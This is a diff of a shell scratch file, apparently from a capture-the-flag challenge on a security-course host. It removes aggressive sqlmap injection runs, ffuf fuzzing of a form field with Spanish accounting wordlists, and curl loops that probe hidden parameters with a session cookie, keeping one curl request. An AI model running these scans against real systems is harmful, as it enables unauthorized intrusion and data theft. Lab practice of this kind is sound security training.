@@ -1,36 +1,3 @@
-BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-sqlmap -u "$BASE/movimientos/1" --method=POST --batch --level=5 --risk=3 --dbms=sqlite --threads=4
-
-BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-# wordlist de categorías contables en español
-printf 'Sueldos\nSalarios\nImpuestos\nTributos\nLegales\nJuridico\nJudicial\nFinanzas\nBancos\nCreditos\nPrestamos\nInversiones\nDividendos\nIntereses\nHonorarios\nAlquileres\nSeguros\nAmortizaciones\nProvisiones\nReservas\nNomina\nRRHH\nRecursos\nGastos\nCaja\nTesoreria\nContabilidad\nAuditoria\nDirectorio\nGerencia\nConfidencial\nReservado\nInterno\nVarios\nOtros\nComisiones\nViajes\nRepresentacion\nDonaciones\nMultas\nSanciones\nIndemnizaciones\nBonos\nAguinaldo\nVacaciones\nRetenciones\nIVA\nGanancias\nPatrimonio\nCapital\nUtilidades\nPerdidas\nIngresos\nEgresos\nVentas\nCompras\nProduccion\nMateriales\nServiciosPublicos\nEnergiaElectrica' > ~/cats.txt
-
-ffuf -u "$BASE/alta" -X POST -d "nombre=x&categoria=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w ~/cats.txt -mc all -ac -t 10
-
-
-
-BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-sqlmap -u "$BASE/alta" --method=POST --data="nombre=test&categoria=Catering" -p nombre --batch --level=5 --risk=3 --threads=4 --dbms=sqlite --technique=BEUST
-
-
-BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-# wordlist grande de español
-ffuf -u "$BASE/alta" -X POST -d "nombre=x&categoria=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -mc all -ac -t 20 2>/dev/null | head -20
-
-
 COOKIE='session=PEGÁ_TU_SESSION'
 BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-
-for cat in "IVA" "AFIP" "ABL" "Impuesto al Cheque"; do
-  for extra in "" "&proveedor=1" "&proveedor_id=1" "&id=1" "&pid=1" "&contar=1" "&force=1"; do
-    r=$(curl -s -b "$COOKIE" "$BASE/alta" \
-      --data-urlencode "nombre=x" --data-urlencode "categoria=$cat" \
-      -d "$extra" | grep -oiE "flash[^>]*>[^<]+" | head -1)
-    echo "[$cat $extra] -> $r"
-  done
-done
-
-
-COOKIE='session=PEGÁ_TU_SESSION'
-BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
-curl -s -b "$COOKIE" "$BASE/" | grep -oiE 'idcol">[0-9]+</td>[^#]*?cat">[^<]+' | sed -E 's/<[^>]+>/ /g' | grep -viE "Capacitacion|Catering|Consultoria|Insumos|Limpieza|Logistica|Mantenimiento|Marketing|Mobiliario|Papeleria|Seguridad|Servicios|Software|Tecnologia|Telefonia|Transporte|Viaticos"
+curl -s -b "$COOKIE" -L "$BASE/alta" --data-urlencode "nombre=x" --data-urlencode "categoria=IVA" | grep -i "flash"
